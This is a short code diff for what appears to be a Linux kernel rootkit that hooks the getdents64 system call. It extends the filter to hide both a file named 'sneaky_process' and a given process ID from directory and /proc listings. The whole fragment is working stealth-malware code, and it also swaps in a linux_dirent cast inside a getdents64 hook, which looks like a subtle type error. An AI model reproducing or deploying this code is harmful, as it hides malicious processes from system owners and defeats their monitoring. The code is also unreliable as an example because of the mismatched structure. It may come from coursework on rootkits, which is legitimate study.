@@ -54,8 +54,8 @@ asmlinkage long sneaky_sys_getdents64(unsigned int fd, struct linux_dirent64 *di
   nread = original_getdents64(fd,dirptr,count);
 
   for(bpos=0;bpos<nread;){
-    d = (struct linux_dirent64 *)((char *)dirptr + bpos);
-    if (strcmp(d->d_name, "sneaky_process") == 0){
+    d = (struct linux_dirent *)((char *)dirptr + bpos);
+    if (strcmp(d->d_name, "sneaky_process") == 0 || strcmp(d->d_name, process_id) == 0){
       int current_size = d->d_reclen;
       int rest = ((char*)dirptr+nread) - ((char*)d+current_size);
       void* source = (char*)d + current_size;
